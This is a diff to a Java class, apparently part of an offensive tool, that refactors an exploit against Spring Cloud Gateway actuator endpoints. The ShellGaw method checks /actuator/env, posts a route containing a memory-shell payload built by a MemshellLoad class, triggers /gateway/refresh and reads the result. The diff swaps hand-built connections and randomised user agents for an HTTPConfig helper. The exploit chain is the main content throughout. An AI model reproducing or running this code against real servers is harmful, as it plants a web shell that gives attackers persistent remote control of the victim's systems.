@@ -1,16 +1,14 @@
-package src.main.Exp.ExpCore;
+package src.main.exp.core;
 
-import src.main.LoadLib.MemshellLoad.MemshellLoad;
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
+import src.main.loadlib.MemshellLoad.MemshellLoad;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Stream;
@@ -23,7 +21,6 @@ public class ExpCore {
     public Stream<String> ShellGaw() throws IOException {
         Stream.Builder<String> builder = Stream.builder();
         String res = "";
-        String ua = "";
         String refapi = "";
         String api = "";
         String data =
@@ -41,12 +38,7 @@ public class ExpCore {
         MemshellLoad ms = new MemshellLoad();
         String shell = ms.run();
         String shellData = String.format(data,shell);
-        URL obj = new URL(address + "/actuator/env");
-        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-        UA_Config uacf = new UA_Config();
-        List<String> ualist = uacf.loadUserAgents();
-        ua = uacf.getRandomUserAgent(ualist);
-        conn.setRequestProperty("User-Agent",ua);
+        HttpURLConnection conn = HTTPConfig.createConnection(address + "/actuator/env");
         conn.setRequestMethod("GET");
         conn.setDoOutput(true);
         int responseCode = conn.getResponseCode();
@@ -58,8 +50,7 @@ public class ExpCore {
             refapi = "/gateway/refresh";
         }
         String site = address + api;
-        URL obj1 = new URL(site);
-        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
         conn1.setRequestMethod("POST");
         conn1.setRequestProperty("Content-Type", "application/json");
         conn1.setDoOutput(true);
@@ -70,15 +61,13 @@ public class ExpCore {
         int responseCode1 = conn1.getResponseCode();
         if (responseCode1 == HttpURLConnection.HTTP_CREATED){
             String site1 = address + refapi;
-            URL obj2 = new URL(site1);
-            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+            HttpURLConnection conn2 = HTTPConfig.createConnection(site1);
             conn2.setRequestMethod("POST");
             conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
             conn2.setDoOutput(true);
             int responseCode2 = conn2.getResponseCode();
             if (responseCode2 == HttpURLConnection.HTTP_OK){
-                URL obj3 = new URL(site);
-                HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
+                HttpURLConnection conn3 = HTTPConfig.createConnection(site);
                 conn3.setRequestMethod("GET");
                 conn3.setDoOutput(true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(conn3.getInputStream()));
